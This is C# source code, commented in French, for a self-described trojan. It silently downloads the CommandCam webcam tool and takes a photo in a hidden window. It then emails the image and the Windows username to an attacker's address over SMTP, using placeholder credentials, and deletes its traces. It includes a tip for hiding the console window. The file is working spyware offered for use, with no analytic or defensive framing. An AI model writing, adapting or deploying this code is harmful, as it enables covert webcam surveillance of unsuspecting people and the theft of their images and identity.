/*
 * TROJAN utilisant la webcam d'un ordinateur portable :
 * A l'exécution télécharge le freeware CommandCam.exe, prend une photo, récupère le nom de l'utilisateur et envoie le tout par email
 */

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;

namespace CommandCamTrojan
{
    class Program
    {
        // Pour masquer la fenêtre Console, changer le type de sortie dans les propriétés de Application console à Application windows

        // PROPRIETES
        private string commandCamPath = Path.Combine(Environment.GetEnvironmentVariable("temp"), "CommandCam.exe");
        private string commandCamDownloadLink = "https://raw.githubusercontent.com/tedburke/CommandCam/master/CommandCam.exe";
        private string temporaryFilePath = Path.Combine(Path.GetTempPath(), "sc_" + DateTime.Now.ToString("ddMMyyyy_HHMMss") + ".jpg");
        private bool isImageTaken = false;
        private string sourceEmail = "email_sender_adress_here";
        private string sourcePassword = "password_here";
        private string targetEmail = "email_destination_adress_here";

        // CONSTRUCTEUR
        public Program()
        {
        }

        // METHODES
        // Méthode Main d'entrée du programme
        public static void Main(string[] args)
        {
            Program program = new Program();
            program.Run();
        }


        private void Run()
        {
            try
            {
                // Télechargement de CommandCam.exe
                if (!File.Exists(commandCamPath))
                {
                    DownloadCommandCam();
                }

                if (File.Exists(commandCamPath))
                {
                    TakeImageWithCamera();
                    if (isImageTaken)
                    {
                        SendEmail();
                        DeleteFiles();
                    }
                }
            }
            catch (Exception)
            {
                // Echec...tant pis...
            }
        }

        private void DownloadCommandCam()
        {
            WebClient webClient = new WebClient();
            webClient.DownloadFile(commandCamDownloadLink, commandCamPath);
        }

        private void TakeImageWithCamera()
        {
            Process cameraCamProcess = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.FileName = commandCamPath;
            startInfo.Arguments = "/filename \"" + temporaryFilePath + "\" /delay " + 4500 + " /devnum " + 1;
            cameraCamProcess.StartInfo = startInfo;
            cameraCamProcess.Start();
            cameraCamProcess.WaitForExit();
            if (File.Exists(temporaryFilePath))
            {
                isImageTaken = true;
            }
        }

        private void SendEmail()
        {
            SmtpClient smtpClient = null;

            // Récupération Username
            string username = System.Security.Principal.WindowsIdentity.GetCurrent().Name.ToString();

            // Construction de l'email
            Attachment image = new Attachment(temporaryFilePath);
            MailMessage mailMessage = new MailMessage()
            {
                From = new MailAddress(sourceEmail),
                Subject = "Image webcam ordi",
                Body = $"Capture webcam de l'ordinateur {username}",
                IsBodyHtml = false
            };
            mailMessage.To.Add(targetEmail);
            mailMessage.Attachments.Add(image);

            smtpClient = new SmtpClient("smtp_server_adress_here")
            {
                Port = 587,
                EnableSsl = true,
                Credentials = new NetworkCredential(sourceEmail, sourcePassword)
            };
            smtpClient.Send(mailMessage);
            image.Dispose();
            smtpClient.Dispose();
        }

        private void DeleteFiles()
        {
            if (File.Exists(commandCamPath))
            {
                File.Delete(commandCamPath);
            }
            if (File.Exists(temporaryFilePath))
            {
                File.Delete(temporaryFilePath);
            }
        }

    }
}
